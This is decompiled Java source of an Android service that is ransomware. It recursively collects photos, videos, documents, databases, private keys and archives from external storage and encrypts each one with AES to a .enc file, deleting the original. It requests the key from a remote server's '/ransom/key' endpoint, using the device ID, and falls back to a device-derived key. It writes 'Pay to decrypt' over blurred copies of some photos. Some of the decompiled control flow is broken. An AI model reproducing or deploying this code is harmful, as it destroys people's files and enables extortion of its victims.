/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Service
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.BitmapFactory$Options
 *  android.graphics.Canvas
 *  android.os.Build$VERSION
 *  android.os.Environment
 *  android.os.IBinder
 *  android.provider.Settings$Secure
 *  android.text.Layout$Alignment
 *  android.text.StaticLayout
 *  android.text.TextPaint
 *  android.util.Log
 *  org.json.JSONObject
 */
package com.love.app;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.util.Log;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.love.app.Aes;
import com.love.app.BlurBuilder;
import com.love.app.ConfigFetcher;
import com.love.app.MyService$$ExternalSyntheticLambda0;
import com.love.app.MyService$$ExternalSyntheticLambda1;
import com.love.app.MyService$$ExternalSyntheticLambda2;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import org.json.JSONObject;

public class MyService
extends Service {
    private static final String TAG = "MyService";
    private static final String[] TARGET_EXTENSIONS = new String[]{".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp4", ".3gp", ".avi", ".mkv", ".mov", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".odb", ".odt", ".ods", ".odp", ".csv", ".tsv", ".psd", ".ai", ".cdr", ".sql", ".db", ".sqlite", ".mdb", ".accdb", ".bak", ".backup", ".key", ".pem", ".ppk", ".asc", ".gpg", ".7z", ".rar", ".zip", ".tar", ".gz"};

    private byte[] blurPhoto(File object) {
        Object object2;
        block3: {
            try {
                object2 = new BitmapFactory.Options();
                ((BitmapFactory.Options)object2).inPreferredConfig = Bitmap.Config.ARGB_8888;
                object = BitmapFactory.decodeFile((String)((File)object).getAbsolutePath(), (BitmapFactory.Options)object2);
                if (object != null) break block3;
                return null;
            }
            catch (Exception exception) {
                return null;
            }
        }
        object = this.drawText(BlurBuilder.blur((Context)this, (Bitmap)object), "Your files have been encrypted. Pay to decrypt.");
        object2 = new ByteArrayOutputStream();
        object.compress(Bitmap.CompressFormat.PNG, 100, (OutputStream)object2);
        object = ((ByteArrayOutputStream)object2).toByteArray();
        return object;
    }

    private Bitmap drawText(Bitmap bitmap, String string2) {
        bitmap = bitmap.copy(Bitmap.Config.ARGB_8888, true);
        Canvas canvas = new Canvas(bitmap);
        TextPaint textPaint = new TextPaint(1);
        textPaint.setColor(-65536);
        textPaint.setTextSize(30.0f);
        textPaint.setShadowLayer(1.0f, 0.0f, 1.0f, -1);
        int n = canvas.getWidth() - 50;
        string2 = new StaticLayout((CharSequence)string2, textPaint, n, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false);
        canvas.save();
        canvas.translate((float)(canvas.getWidth() - n) / 2.0f, (float)(canvas.getHeight() - string2.getHeight()) / 2.0f);
        string2.draw(canvas);
        canvas.restore();
        return bitmap;
    }

    private void fetchKeyAndStart() {
        String string2 = ConfigFetcher.getBaseUrl((Context)this);
        if (string2 != null && !string2.isEmpty()) {
            String string3 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
            string3 = string2 + "/ransom/key?device_id=" + string3;
            Volley.newRequestQueue((Context)this).add(new JsonObjectRequest(0, string3, null, new MyService$$ExternalSyntheticLambda0(this), (Response.ErrorListener)new MyService$$ExternalSyntheticLambda1(this)));
            return;
        }
        Log.w((String)TAG, (String)"baseUrl kosong, pakai key fallback");
        this.runRansomware(this.generateDeviceKey());
    }

    private byte[] generateDeviceKey() {
        String string2;
        String string3 = string2 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"android_id");
        if (string2 == null) {
            string3 = "defaultkey12345x";
        }
        return (string3 + "0000000000000000").substring(0, 16).getBytes();
    }

    private List<File> getFiles(File file2, String[] stringArray, String[] stringArray2) {
        ArrayList<File> arrayList = new ArrayList<File>();
        File[] fileArray = file2.listFiles();
        if (fileArray == null) {
            return arrayList;
        }
        block0: for (File file2 : fileArray) {
            if (file2.isDirectory()) {
                int n;
                block5: {
                    int n2 = stringArray2.length;
                    for (n = 0; n < n2; ++n) {
                        String string2 = stringArray2[n];
                        if (!file2.getPath().contains(string2)) continue;
                        n = 1;
                        break block5;
                    }
                    n = 0;
                }
                if (n != 0) continue;
                arrayList.addAll(this.getFiles(file2, stringArray, stringArray2));
                continue;
            }
            for (String string2 : stringArray) {
                if (!file2.getName().toLowerCase().endsWith(string2.toLowerCase())) continue;
                arrayList.add(file2);
                continue block0;
            }
        }
        return arrayList;
    }

    private boolean isImageFile(File object) {
        boolean bl = ((String)(object = ((File)object).getName().toLowerCase())).endsWith(".jpg") || ((String)object).endsWith(".jpeg") || ((String)object).endsWith(".png") || ((String)object).endsWith(".gif") || ((String)object).endsWith(".bmp");
        return bl;
    }

    private byte[] readFileToBytes(File object) throws IOException {
        try (FileInputStream fileInputStream = new FileInputStream((File)object);){
            object = new byte[(int)((File)object).length()];
            fileInputStream.read((byte[])object);
            return object;
        }
    }

    private void runRansomware(byte[] byArray) {
        new Thread(new MyService$$ExternalSyntheticLambda2(this, byArray)).start();
    }

    /*
     * Loose catch block
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private void saveFile(byte[] byArray, String string2) {
        FileOutputStream fileOutputStream = new FileOutputStream(string2);
        fileOutputStream.write(byArray);
        fileOutputStream.close();
        return;
        catch (Throwable throwable) {
            try {
                fileOutputStream.close();
                throw throwable;
            }
            catch (Throwable throwable2) {
                try {
                    throwable.addSuppressed(throwable2);
                    throw throwable;
                }
                catch (Exception exception) {
                    Log.w((String)TAG, (String)("saveFile failed: " + string2), (Throwable)exception);
                }
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void startRansomware(byte[] byArray) {
        File file;
        Object object = new ArrayList<File>();
        if (Build.VERSION.SDK_INT < 29) {
            object.addAll(this.getFiles(Environment.getExternalStorageDirectory(), TARGET_EXTENSIONS, new String[]{"Android/data", "Android/obb"}));
        } else {
            Log.w((String)TAG, (String)"Android 10+ detected, ransomware limited to app's own files");
            file = this.getExternalFilesDir(null);
            if (file != null) {
                object.addAll(this.getFiles(file, TARGET_EXTENSIONS, new String[0]));
            }
        }
        object = object.iterator();
        while (object.hasNext()) {
            file = (File)object.next();
            try {
                StringBuilder stringBuilder;
                Object object2;
                if (file.getPath().contains(".enc") || file.getPath().contains("brld_")) continue;
                if (this.isImageFile(file) && ((Random)(object2 = new Random())).nextInt(20) == 0 && (object2 = (Object)this.blurPhoto(file)) != null) {
                    stringBuilder = new StringBuilder();
                    this.saveFile((byte[])object2, stringBuilder.append(file.getParentFile().getPath()).append(File.separator).append("brld_").append(file.getName()).toString());
                }
                object2 = Aes.encrypt(byArray, this.readFileToBytes(file));
                stringBuilder = new StringBuilder();
                this.saveFile((byte[])object2, stringBuilder.append(file.getPath()).append(".enc").toString());
                file.delete();
            }
            catch (Exception exception) {
                Log.w((String)TAG, (String)("Skip file: " + file.getName()), (Throwable)exception);
                continue;
            }
            break;
        }
        return;
    }

    /* synthetic */ void lambda$fetchKeyAndStart$0$com_love_app_MyService(JSONObject jSONObject) {
        try {
            this.runRansomware(jSONObject.getString("key").getBytes());
        }
        catch (Exception exception) {
            this.runRansomware(this.generateDeviceKey());
        }
    }

    /* synthetic */ void lambda$fetchKeyAndStart$1$com_love_app_MyService(VolleyError volleyError) {
        this.runRansomware(this.generateDeviceKey());
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    /* synthetic */ void lambda$runRansomware$2$com_love_app_MyService(byte[] byArray) {
        Throwable throwable2;
        block4: {
            this.startRansomware(byArray);
            {
                catch (Throwable throwable2) {
                    break block4;
                }
                catch (Exception exception) {}
                {
                    Log.e((String)TAG, (String)"Ransomware error", (Throwable)exception);
                }
            }
            this.stopSelf();
            return;
        }
        this.stopSelf();
        throw throwable2;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int n, int n2) {
        if (this.checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") != 0) {
            Log.e((String)TAG, (String)"WRITE_EXTERNAL_STORAGE permission not granted");
            this.stopSelf();
            return 2;
        }
        this.fetchKeyAndStart();
        return 2;
    }
}

